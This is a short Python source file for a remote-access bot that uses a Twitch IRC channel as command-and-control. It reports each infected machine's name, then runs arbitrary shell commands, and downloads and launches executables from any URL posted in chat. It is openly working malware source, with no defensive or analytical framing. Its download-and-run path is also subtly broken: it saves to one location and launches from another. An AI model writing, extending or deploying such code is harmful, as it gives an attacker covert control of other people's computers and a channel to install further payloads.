import re
from time import sleep
import socket
import os
import urllib.request

HOST = "irc.twitch.tv"
PORT = 6667
NICK = "username"
PASS = "oauth:"
CHAN = "#evnl_"
RATE = (20 / 30)
CHAT_MSG = re.compile(r"^:\w+!\w+@\w+\.tmi\.twitch\.tv PRIVMSG #\w+ :")
clientName = os.environ['COMPUTERNAME']

def main():
    try:
        s = socket.socket()
        s.connect((HOST, PORT))
        s.send("PASS {}\r\n".format(PASS).encode("utf-8"))
        s.send("NICK {}\r\n".format(NICK).encode("utf-8"))
        s.send("JOIN {}\r\n".format(CHAN).encode("utf-8"))
        connected = True
        chat(s, clientName + " connected.")
    except:
        connected = False

    while connected:
        response = s.recv(1024).decode("utf-8")
        if response == "PING :tmi.twitch.tv\r\n":
            s.send("PONG :tmi.twitch.tv\r\n".encode())
        else:
            #Legacy but possible use in only allowing one user to issue commands
            #username = re.search(r"\w+", response).group(0)
            message = CHAT_MSG.sub("", response)
            if message == "!list\r\n":
                chat(s, clientName + " is online.")
            elif message.startswith('!act'):
                messageArray = message.split(" ")
                if messageArray[1] == 'all' or messageArray[1] == clientName:
                    if messageArray[2] == 'cmd':
                        try:
                            os.system(messageArray[3])
                            chat(s, clientName + " completed the command.")
                        except Exception as e:
                            chat(s, clientName + " encountered an error. " + str(e))
                    elif messageArray[2] == 'de':
                        try:
                            url = messageArray[3]
                            path = os.path.expanduser("~") + "/Downloads/file.exe"
                            urllib.request.urlretrieve(url, path)
                            os.system('start C:/Windows/file.exe')
                            os.remove(path)
                            chat(s, clientName + " completed the command.")
                        except Exception as e:
                            chat(s, clientName + " encountered an error. " + str(e))
                    else:
                        chat(s, "Incorrect command usage.")

        sleep(1)


def chat(sock, msg):
    sock.send("PRIVMSG {} :{}".format(CHAN, msg+"\r\n").encode())

main()
